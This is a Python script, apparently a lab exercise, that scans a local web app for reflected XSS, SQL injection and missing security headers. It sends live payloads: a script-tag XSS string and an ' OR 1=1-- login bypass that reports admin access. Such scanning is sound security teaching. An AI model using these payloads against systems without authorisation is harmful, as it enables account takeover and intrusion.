import requests

# Text starting the detection
print("Starting Vulnerability Detection..")

base_url = "http://localhost:3000"

# PART 3: XSS Vulnerability Detection
print("\nTesting for Reflected XSS...")

# Payload to trigger the exploit
xss_payload = "<script>alert('XSS')</script>"

# Base URL
target_url = f"{base_url}/rest/products/search?q={xss_payload}"

# Sends the attack
response = requests.get(target_url)

# Checking if exact string appears in payloads
if xss_payload in response.text or "%3Cscript%3E" in response.text:
    print(f"LOG: XSS Vulnerability Found at {target_url}")
    print(f"Payload was reflected: {xss_payload}")
else:
    print("No XSS Vulnerability Found.")


# PART 4: SQL INJECTION DETECTION
print("\nStarting SQL Injection Detection..")

# Test 1: Login Bypass
sqli_payload = "' OR 1=1--"
login_url = f"{base_url}/rest/user/login"
credentials = {"email": sqli_payload, "password": "password"}

print(f"Attempting Bypass with: {sqli_payload}")
response = requests.post(login_url, json=credentials)

if response.status_code == 200:
    print(f"ALERT: SQL Injection Successful at {login_url}")
    print(f"Logged in as Admin!")
    # Token print removed as requested


# Test 2: Syntax Breaking
print("\nAttempting Syntax Error Check...")
broken_payload = "'"  # Quote to break the syntax
credentials_broken = {"email": broken_payload, "password": "password"}

response_error = requests.post(login_url, json=credentials_broken)

if response_error.status_code == 500 or "SQLITE_ERROR" in response_error.text:
    print("ALERT: Database Error Found (Status 500)")
    print("Server Revealed: Vulnerable to syntax errors.")
else:
    print("No DB error returned.")

print("\nScan Complete")

# PART 5: HEADER ANALYSIS
print("\nStarting Server Configuration Analysis...")

# Targeting main URL
target_url = "http://localhost:3000"
response = requests.get(target_url)

# List of headers to check
headers_to_check = [
    "Content-Security-Policy",
    "Strict-Transport-Security",
    "X-Content-Type-Options"
]

print(f"Checking headers for: {target_url}")

# Check if they exist in response.headers
for header in headers_to_check:
    if header in response.headers:
        print(f"[OK] {header} is present.")
    else:
        # If header is missing print "Low Severity Message"
        print(f"Low Severity Missing Header: {header}")

print("\nFinal Scan Complete")


# PART 6: Automated Detect Logic
print("\n" + "="*40)
print("Final Vulnerability Summary")
print("="*40)

# Final XSS verification check
xss_check = requests.get(f"{base_url}/rest/products/search?q=<script>alert('XSS')</script>")
if "<script>alert('XSS')</script>" in xss_check.text:
    print("Reflected XSS:       [Critical] Vulnerable")
else:
    print("Reflected XSS:       [Secure] Not Detected")

# Final SQL Injection verification check
sqli_check = requests.post(f"{base_url}/rest/user/login", json={"email": "' OR 1=1--", "password": "x"})
if sqli_check.status_code == 200:
    print("SQL Injection:       [Critical] Vulnerable (Bypass Successful)")
else:
    print("SQL Injection:       [Safe] Failed")

# 3. Header Analysis
missing_count = 0
headers = ["Content-Security-Policy", "Strict-Transport-Security", "X-Content-Type-Options"]
for h in headers:
    if h not in response.headers:
        missing_count += 1

print(f"Missing Headers:     {missing_count}")
print("-" * 40)
print("Scan Complete.")
print("="*40)
